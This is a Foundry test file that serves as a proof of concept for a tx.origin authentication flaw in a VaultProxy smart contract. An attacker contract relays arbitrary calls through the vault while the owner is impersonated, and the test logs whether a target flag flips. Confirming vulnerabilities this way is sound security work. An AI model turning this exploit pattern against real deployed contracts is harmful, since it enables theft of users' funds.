// SPDX-License-Identifier: MIT
pragma solidity 0.8.26;
pragma experimental ABIEncoderV2;

import "forge-std/Test.sol";
import "../src/0xbaa3de6504690efb064420d89e871c27065cdd52.sol";

contract MaliciousActor {
    VaultProxy public vault;

    constructor(address payable _vault) {
        vault = VaultProxy(_vault);
    }

    function exploit(address target, bytes memory data) external {
        vault.proxy{value: 0}(target, data);
    }
}

contract TargetContract {
    bool public exploited;

    function performExploit() external {
        exploited = true;
    }
}

contract TxOriginVulnerabilityTest is Test {
    VaultProxy public vault;
    MaliciousActor public malicious;
    TargetContract public target;
    
    address owner = makeAddr("owner");

    function setUp() public {
        vm.deal(owner, 1 ether);

        vm.startPrank(owner);
        vault = new VaultProxy{value: 0.1 ether}();
        target = new TargetContract();
        vm.stopPrank();

        malicious = new MaliciousActor(payable(address(vault)));
    }

    function testTxOriginVulnerability() public {
        // --- BEFORE-Trigger Exploited ---
        bool initialExploited = target.exploited();
        emit log_string("--- BEFORE-Trigger Exploited ---");
        emit log_named_string("Initial exploited state", initialExploited ? "true" : "false");
        
        // Trigger the exploit
        emit log_string("--- Trigger Exploit ---");
        // Simulate owner being tricked into calling malicious contract
        vm.prank(owner, owner);
        malicious.exploit(
            address(target),
            abi.encodeWithSelector(TargetContract.performExploit.selector)
        );

        // --- AFTER-Trigger Exploited ---
        bool finalExploited = target.exploited();
        emit log_string("--- AFTER-Trigger Exploited ---");
        emit log_named_string("Final exploited state", finalExploited ? "true" : "false");
        
        // --- Differential Verdict ---
        emit log_string("--- Differential Verdict ---");
        emit log_named_string("State changed", initialExploited != finalExploited ? "YES" : "NO");
        
        // Final vulnerability existence verdict
        if(initialExploited == false && finalExploited == true) {
            emit log_string("Vulnerability Exists: Exploited state changed from false to true");
        } else {
            emit log_string("Vulnerability not Exist: No state change from false to true");
        }
    }
}